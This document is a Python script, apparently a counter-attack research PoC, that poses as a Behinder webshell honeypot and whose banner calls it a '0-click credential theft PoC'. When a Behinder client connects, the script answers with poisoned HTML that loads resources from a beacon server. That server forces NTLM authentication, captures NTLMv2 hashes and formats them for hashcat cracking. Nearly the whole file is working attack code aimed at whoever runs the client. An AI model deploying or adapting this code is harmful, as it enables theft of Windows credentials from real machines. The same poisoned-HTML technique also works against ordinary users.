#!/usr/bin/env python3
"""
冰蝎 (Behinder) v4.1 PHP-Xor-Request 蜜罐
==========================================
基于 behinder_php_xor_decrypt.py 的 XOR 加解密算法

协议:
  请求: base64(XOR(func|params))
  响应: base64(XOR(JSON))

用法:
  python3 honeypot_xor.py [蜜罐端口] [信标HTTP端口]
"""

import base64
import hashlib
import json
import os
import re
import struct
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler


# ============================================================
#  配置
# ============================================================
HONEYPOT_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9998
BEACON_PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 9091
PASSWORD      = "rebeyond"

KEY = hashlib.md5(PASSWORD.encode()).hexdigest()[:16]  # "e45e329feb5d925b"

WEB_IP = "蜜罐IP"

LOG_FILE = "honeypot_xor.log"


# ============================================================
#  XOR 加解密 (来自 BlueTeamToolsV1.32.jar)
# ============================================================
def xor_crypt(data: bytes, key: str) -> bytes:
    """XOR: data[i] ^ key[(i+1) & 15]"""
    key_bytes = key.encode()
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key_bytes[(i + 1) & 15]
    return bytes(result)


def decrypt_request(raw: bytes, key: str) -> str:
    """解密请求: base64_decode → XOR"""
    decoded = base64.b64decode(raw)
    plain = xor_crypt(decoded, key)
    return plain.decode('utf-8', errors='replace')


def encrypt_response(plain: str, key: str) -> bytes:
    """加密响应: XOR → base64_encode"""
    data = plain.encode('utf-8')
    encrypted = xor_crypt(data, key)
    return base64.b64encode(encrypted)


# ============================================================
#  日志
# ============================================================
def write_log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


# ============================================================
#  投毒 HTML
# ============================================================
def build_poisoned_html() -> str:
    b = WEB_IP
    p = BEACON_PORT
    return (
        '<h3>Server Info</h3>\n'
        '<p>OS: Linux amd64</p>\n'
        '<p>PHP: 7.2.21</p>\n'
        '<p>User: root</p>\n'
        # 每个 HTTP 资源都会触发 NTLM 401 握手
        f'<img src="http://{b}:{p}/bc.png">\n'
        f'<link href="http://{b}:{p}/style.css" rel="stylesheet">\n'
        f'<script src="http://{b}:{p}/script.js"></script>\n'
        f'<iframe src="http://{b}:{p}/frame.html" style="display:none"></iframe>\n'
        f'<object data="http://{b}:{p}/object.dat"></object>\n'
        f'<embed src="http://{b}:{p}/embed.dat">\n'
        f'<meta http-equiv="refresh" content="0;url=http://{b}:{p}/redirect">\n'
        # CSS 内联触发
        f'<style>@import url("http://{b}:{p}/ntlm.css");</style>\n'
        f'<div style="background:url(http://{b}:{p}/bg.png);width:0;height:0"></div>\n'
        # 音视频 poster 触发
        f'<video poster="http://{b}:{p}/poster.jpg" style="display:none"></video>\n'
        f'<audio><source src="http://{b}:{p}/track.mp3"></audio>\n'
    )


# ============================================================
#  解析 Legacy PHP payload
# ============================================================
def parse_legacy_payload(plain: str) -> dict:
    """解析 func|params 格式"""
    parts = plain.split('|', 1)
    result = {
        "func": parts[0],
        "params": parts[1] if len(parts) > 1 else "",
    }

    # 解码 eval(base64_decode('...')) 中的内容
    m = re.search(r"base64_decode\s*\(\s*['\"]([^'\"]+)['\"]\s*\)", result["params"])
    if m:
        try:
            decoded = base64.b64decode(m.group(1)).decode('utf-8', errors='replace')
            result["decoded_payload"] = decoded
        except Exception:
            pass

    return result


def detect_action(check_code: str) -> str:
    """检测动作类型"""
    if "getInnerIP" in check_code or "basicInfoObj" in check_code:
        return "BasicInfo"
    elif "proc_open" in check_code and "pty" in check_code:
        return "RealCmd"
    elif re.search(r"(system|passthru|shell_exec|exec)\s*\(", check_code):
        return "Cmd"
    elif "function main($content)" in check_code or "function main( $content)" in check_code:
        return "Echo"
    elif re.search(r"(mysqli_connect|mysql_connect|PDO)\s*\(", check_code):
        return "Database"
    elif re.search(r"(file_get_contents|file_put_contents|readfile|fopen|unlink)\s*\(", check_code):
        return "FileOperation"
    return "Unknown"


def extract_echo_content(check_code: str) -> str:
    """从解码后的 PHP 代码中提取 echo 内容
    真实shell行为: $content="base64string"; $content=base64_decode($content); main($content);
    响应: $result["msg"] = base64_encode($content) = 原始base64字符串
    """
    # 模式1: $content="base64...";$content=base64_decode($content);
    # 返回原始base64字符串（不解码），因为真实shell的base64_encode($content)会把它编码回去
    m = re.search(r'\$content\s*=\s*["\']([A-Za-z0-9+/=]+)["\']', check_code)
    if m:
        return m.group(1)  # 返回原始base64字符串

    # 模式2: main("literal_string")
    m = re.search(r'main\s*\(\s*["\']([^"\']+)["\']\s*\)', check_code)
    if m:
        return m.group(1)

    return ""


# ============================================================
#  HTTP 请求处理
# ============================================================
class BehinderHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        src_ip = self.client_address[0]
        write_log(f"GET 探测  来源: {src_ip}  路径: {self.path}")
        self._send_response(b"")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        src_ip = self.client_address[0]

        write_log(f"{'='*60}")
        write_log(f"收到请求  来源: {src_ip}  大小: {len(body)} bytes")

        # 记录请求头
        for k, v in self.headers.items():
            write_log(f"  {k}: {v}")

        # ============================================================
        #  解密请求
        # ============================================================
        try:
            plain = decrypt_request(body, KEY)
            write_log(f"解密成功: {len(plain)} bytes")
        except Exception as e:
            write_log(f"解密失败: {e}")
            self._send_response(b"")
            return

        # ============================================================
        #  解析 Legacy 格式
        # ============================================================
        if '|' in plain:
            info = parse_legacy_payload(plain)
            func = info["func"]
            params = info["params"]
            check_code = info.get("decoded_payload", params)

            write_log(f"协议: Legacy  函数: {func}")

            # 保存解码内容
            os.makedirs("debug_xor", exist_ok=True)
            with open("debug_xor/last_decoded.txt", "w") as f:
                f.write(check_code)

            # 检测动作
            action = detect_action(check_code)
            write_log(f"动作: {action}")

            # ============================================================
            #  构造响应
            # ============================================================
            result = {}

            if action == "Echo":
                echo_content = extract_echo_content(check_code)
                write_log(f"Echo 握手  content={echo_content[:80]}")
                result["status"] = base64.b64encode(b"success").decode()
                # 真实shell: $result["msg"] = base64_encode($content)
                # $content = base64_decode("原始base64字符串")
                # 所以 base64_encode(base64_decode(x)) = x
                # msg 就是原始base64字符串
                result["msg"] = echo_content

            elif action == "BasicInfo":
                write_log("★ BasicInfo — 投毒HTML注入!")
                poisoned_html = build_poisoned_html()
                basic_info = {
                    "basicInfo":   base64.b64encode(poisoned_html.encode()).decode(),
                    "driveList":   base64.b64encode(b"/").decode(),
                    "currentPath": base64.b64encode(b"/var/www/html").decode(),
                    "osInfo":      base64.b64encode(b"Linux").decode(),
                    "arch":        base64.b64encode(b"64").decode(),
                    "localIp":     base64.b64encode(WEB_IP.encode()).decode(),
                }
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(json.dumps(basic_info).encode()).decode()
                write_log(f"★ HTTP信标: http://{WEB_IP}:{BEACON_PORT}/bc.png")
                write_log(f"★ SMB信标:  file://{WEB_IP}/share/smb.png")

            elif action == "Cmd":
                write_log("Cmd 模拟")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(b"uid=0(root) gid=0(root) groups=0(root)\n").decode()

            elif action == "RealCmd":
                write_log("RealCmd 模拟")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(b"root@honeypot:~# ").decode()

            else:
                write_log(f"未识别动作: {action}")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(b"").decode()

        else:
            # default_aes 协议 (备用)
            write_log("协议: default_aes")
            action = detect_action(plain)
            write_log(f"动作: {action}")

            result = {}
            if action == "Echo":
                m = re.search(r'\$content\s*=\s*["\']([A-Za-z0-9+/=]+)["\']', plain)
                echo_content = ""
                if m:
                    echo_content = m.group(1)  # 返回原始base64字符串
                write_log(f"Echo 握手  content={echo_content[:80]}")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = echo_content

            elif action == "BasicInfo":
                write_log("★ BasicInfo — 投毒HTML注入!")
                poisoned_html = build_poisoned_html()
                basic_info = {
                    "basicInfo":   base64.b64encode(poisoned_html.encode()).decode(),
                    "driveList":   base64.b64encode(b"/").decode(),
                    "currentPath": base64.b64encode(b"/var/www/html").decode(),
                    "osInfo":      base64.b64encode(b"Linux").decode(),
                    "arch":        base64.b64encode(b"64").decode(),
                    "localIp":     base64.b64encode(WEB_IP.encode()).decode(),
                }
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(json.dumps(basic_info).encode()).decode()
                write_log(f"★ HTTP信标: http://{WEB_IP}:{BEACON_PORT}/bc.png")

            elif action == "Cmd":
                write_log("Cmd 模拟")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(b"uid=0(root) gid=0(root) groups=0(root)\n").decode()

            elif action == "RealCmd":
                write_log("RealCmd 模拟")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(b"root@honeypot:~# ").decode()

            else:
                write_log(f"未识别动作: {action}")
                result["status"] = base64.b64encode(b"success").decode()
                result["msg"] = base64.b64encode(b"").decode()

        # ============================================================
        #  加密响应 (XOR + base64)
        # ============================================================
        resp_json = json.dumps(result, separators=(',', ':'))
        enc_resp = encrypt_response(resp_json, KEY)

        write_log(f"响应JSON: {resp_json[:200]}")
        write_log(f"加密响应: {len(enc_resp)} bytes")
        write_log(f"{'='*60}")

        self._send_response(enc_resp)

    def _send_response(self, data: bytes):
        self.send_response(200)
        self.send_header("Content-Type", "text/html;charset=UTF-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "close")
        self.send_header("Set-Cookie", f"JSESSIONID={os.urandom(8).hex()}; Path=/")
        self.end_headers()
        self.wfile.write(data)
        self.wfile.flush()

    def log_message(self, *args):
        pass


# ============================================================
#  NTLM 捕获
# ============================================================
NTLM_STATE = {}          # {client_key: server_challenge_bytes}
NTLM_LOG_FILE = "ntlm_captures.log"


def build_ntlm_type2(server_challenge: bytes, target: str = "WORKGROUP") -> bytes:
    """构造 NTLM Type 2 Challenge 消息"""
    target_bytes = target.encode('utf-16-le')
    info_bytes = b''
    name_offset = 48
    info_offset = name_offset + len(target_bytes)

    msg = bytearray()
    msg += b'NTLMSSP\x00'
    msg += struct.pack('<I', 2)
    msg += struct.pack('<HHI', len(target_bytes), len(target_bytes), name_offset)
    msg += struct.pack('<I', 0x00008201)
    msg += server_challenge
    msg += b'\x00' * 8
    msg += struct.pack('<HHI', len(info_bytes), len(info_bytes), info_offset)
    msg += target_bytes
    msg += info_bytes
    return bytes(msg)


def parse_ntlm_type3(data: bytes) -> dict:
    """解析 NTLM Type 3 Authenticate 消息, 提取 NTLMv2 哈希"""
    # NTLM Type 3 结构:
    #   sig(8) + type(4) + 6*field(8) + flags(4) = 64 字节头
    #   然后是 payload: lm_resp, ntlm_resp, domain, user, host
    if len(data) < 64:
        return None
    if data[:8] != b'NTLMSSP\x00':
        return None

    msg_type = struct.unpack('<I', data[8:12])[0]
    if msg_type != 3:
        return None

    # 解析各字段的长度和偏移
    def parse_field(offset):
        length = struct.unpack('<H', data[offset:offset+2])[0]
        field_offset = struct.unpack('<I', data[offset+4:offset+8])[0]
        return length, field_offset

    lm_len, lm_off = parse_field(12)
    ntlm_len, ntlm_off = parse_field(20)
    dom_len, dom_off = parse_field(28)
    user_len, user_off = parse_field(36)
    host_len, host_off = parse_field(44)

    def safe_decode(raw, offset, length):
        try:
            return raw[offset:offset+length].decode('utf-16-le').rstrip('\x00')
        except Exception:
            return raw[offset:offset+length].hex()

    domain = safe_decode(data, dom_off, dom_len)
    user = safe_decode(data, user_off, user_len)
    host = safe_decode(data, host_off, host_len)
    ntlm_resp = data[ntlm_off:ntlm_off+ntlm_len]
    lm_resp = data[lm_off:lm_off+lm_len]

    return {
        'domain': domain,
        'user': user,
        'host': host,
        'ntlm_resp': ntlm_resp,
        'lm_resp': lm_resp,
    }


def format_ntlmv2_hash(domain, user, server_challenge, ntlm_resp) -> str:
    """格式化 NTLMv2 哈希为 hashcat 5600 格式:
       user::domain:server_challenge:NTProofStr:blob
    """
    sc_hex = server_challenge.hex()
    if len(ntlm_resp) >= 16:
        nt_proof = ntlm_resp[:16].hex()
        blob = ntlm_resp[16:].hex()
        return f"{user}::{domain}:{sc_hex}:{nt_proof}:{blob}"
    return f"(short response: {ntlm_resp.hex()})"


# ============================================================
#  HTTP 信标 + NTLM 捕获
# ============================================================
class BeaconHandler(BaseHTTPRequestHandler):
    PNG_1x1 = base64.b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQABNjN9GQAAAABJRU5ErkJggg=="
    )

    def do_GET(self):
        src_ip = self.client_address[0]
        src_port = self.client_address[1]
        ua = self.headers.get("User-Agent", "")
        lang = self.headers.get("Accept-Language", "")
        auth = self.headers.get("Authorization", "")
        client_key = f"{src_ip}:{src_port}"

        # NTLM 状态机
        if not auth:
            # 第一次请求: 发送 401 + WWW-Authenticate: NTLM
            server_challenge = os.urandom(8)
            NTLM_STATE[client_key] = server_challenge
            write_log(f"{'#'*60}")
            write_log(f"★ 信标请求 → NTLM 质询 ★")
            write_log(f"  来源: {src_ip}:{src_port}")
            write_log(f"  UA:   {ua[:120]}")
            write_log(f"{'#'*60}")

            info = {"time": datetime.now().isoformat(), "src_ip": src_ip, "ua": ua,
                    "lang": lang, "path": self.path, "event": "ntlm_challenge_sent"}
            with open("beacon_log.json", "a") as f:
                json.dump(info, f, ensure_ascii=False)
                f.write("\n")

            self.send_response(401)
            self.send_header("WWW-Authenticate", "NTLM")
            self.send_header("Content-Length", "0")
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            return

        elif auth.upper().startswith("NTLM ") and len(auth) > 5:
            ntlm_data = base64.b64decode(auth[5:])

            if ntlm_data[:8] == b'NTLMSSP\x00':
                msg_type = struct.unpack('<I', ntlm_data[8:12])[0]

                if msg_type == 1:
                    # Type 1 (Negotiate) → 返回 Type 2 (Challenge)
                    server_challenge = os.urandom(8)
                    NTLM_STATE[client_key] = server_challenge
                    type2 = build_ntlm_type2(server_challenge)
                    type2_b64 = base64.b64encode(type2).decode()

                    write_log(f"{'#'*60}")
                    write_log(f"★ NTLM Type1 收到 → 返回 Type2 挑战 ★")
                    write_log(f"  来源: {src_ip}:{src_port}")
                    write_log(f"  UA:   {ua[:120]}")
                    write_log(f"  挑战: {server_challenge.hex()}")
                    write_log(f"{'#'*60}")

                    info = {"time": datetime.now().isoformat(), "src_ip": src_ip, "ua": ua,
                            "lang": lang, "path": self.path, "event": "ntlm_type1_received",
                            "server_challenge": server_challenge.hex()}
                    with open("beacon_log.json", "a") as f:
                        json.dump(info, f, ensure_ascii=False)
                        f.write("\n")

                    self.send_response(401)
                    self.send_header("WWW-Authenticate", f"NTLM {type2_b64}")
                    self.send_header("Content-Length", "0")
                    self.send_header("Connection", "keep-alive")
                    self.end_headers()
                    return

                elif msg_type == 3:
                    # Type 3 (Authenticate) → 提取 NTLMv2 哈希!
                    result = parse_ntlm_type3(ntlm_data)
                    server_challenge = NTLM_STATE.pop(client_key, b'\x00' * 8)

                    if result:
                        hashcat_line = format_ntlmv2_hash(
                            result['domain'], result['user'],
                            server_challenge, result['ntlm_resp']
                        )

                        write_log(f"{'#'*60}")
                        write_log(f"★★★ NTLMv2 凭据捕获! ★★★")
                        write_log(f"  来源IP:   {src_ip}")
                        write_log(f"  域名:     {result['domain']}")
                        write_log(f"  用户名:   {result['user']}")
                        write_log(f"  主机名:   {result['host']}")
                        write_log(f"  NTLM响应: {result['ntlm_resp'].hex()}")
                        write_log(f"  Hashcat:  {hashcat_line}")
                        write_log(f"{'#'*60}")

                        ntlm_info = {
                            "time": datetime.now().isoformat(),
                            "src_ip": src_ip,
                            "ua": ua,
                            "domain": result['domain'],
                            "user": result['user'],
                            "host": result['host'],
                            "ntlm_resp": result['ntlm_resp'].hex(),
                            "server_challenge": server_challenge.hex(),
                            "hashcat": hashcat_line,
                        }
                        with open("beacon_log.json", "a") as f:
                            json.dump(ntlm_info, f, ensure_ascii=False)
                            f.write("\n")
                        with open(NTLM_LOG_FILE, "a") as f:
                            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {hashcat_line}\n")
                    else:
                        write_log(f"[!] NTLM Type3 解析失败: {ntlm_data[:32].hex()}")

                    # 返回正常内容 (1x1 PNG)
                    self._send_png(src_ip, ua, lang)
                    return

        # 非 NTLM 或后续请求 → 直接返回图片
        self._send_png(src_ip, ua, lang)

    def _send_png(self, src_ip, ua, lang):
        write_log(f"{'#'*60}")
        write_log(f"★ HTTP 信标触发 ★")
        write_log(f"  来源: {src_ip}")
        write_log(f"  UA:   {ua[:120]}")
        write_log(f"{'#'*60}")

        info = {"time": datetime.now().isoformat(), "src_ip": src_ip, "ua": ua,
                "lang": lang, "path": self.path, "event": "beacon_triggered"}
        with open("beacon_log.json", "a") as f:
            json.dump(info, f, ensure_ascii=False)
            f.write("\n")

        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.send_header("Content-Length", str(len(self.PNG_1x1)))
        self.end_headers()
        self.wfile.write(self.PNG_1x1)

    def log_message(self, *args):
        pass


# ============================================================
#  主入口
# ============================================================
def main():
    print(r"""
  ╔═══════════════════════════════════════════════════════╗
  ║  冰蝎 (Behinder) v4.1 PHP-Xor-Request 蜜罐          ║
  ║  0-click 凭据窃取 PoC                                ║
  ╚═══════════════════════════════════════════════════════╝
    """)
    print(f"  WebShell URL : http://{WEB_IP}:{HONEYPOT_PORT}/shell.php")
    print(f"  连接密码     : {PASSWORD}")
    print(f"  XOR Key      : {KEY}")
    print(f"  HTTP 信标    : http://{WEB_IP}:{BEACON_PORT}/bc.png")
    print()

    beacon_server = HTTPServer(("0.0.0.0", BEACON_PORT), BeaconHandler)
    threading.Thread(target=beacon_server.serve_forever, daemon=True).start()
    print(f"  [HTTP信标] 监听 0.0.0.0:{BEACON_PORT}")

    honeypot_server = HTTPServer(("0.0.0.0", HONEYPOT_PORT), BehinderHandler)
    threading.Thread(target=honeypot_server.serve_forever, daemon=True).start()
    print(f"  [蜜罐]     监听 0.0.0.0:{HONEYPOT_PORT}")

    print(f"""
  ┌──────────────────────────────────────────────────────┐
  │ 1. 冰蝎客户端添加WebShell:                           │
  │    URL: http://{WEB_IP}:{HONEYPOT_PORT}/shell.php           │
  │    密码: {PASSWORD}                                       │
  │                                                      │
  │ 2. 双击连接 → 自动触发 Echo → BasicInfo              │
  │ 3. 蜜罐返回投毒HTML → WebView自动渲染 → 0-click     │
  │ 4. HTTP资源触发 NTLM 认证 → 抓取 NTLMv2 哈希        │
  │ 5. 查看 beacon_log.json / ntlm_captures.log          │
  └──────────────────────────────────────────────────────┘
    """)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] 蜜罐已停止")
        beacon_server.shutdown()
        honeypot_server.shutdown()


if __name__ == "__main__":
    main()
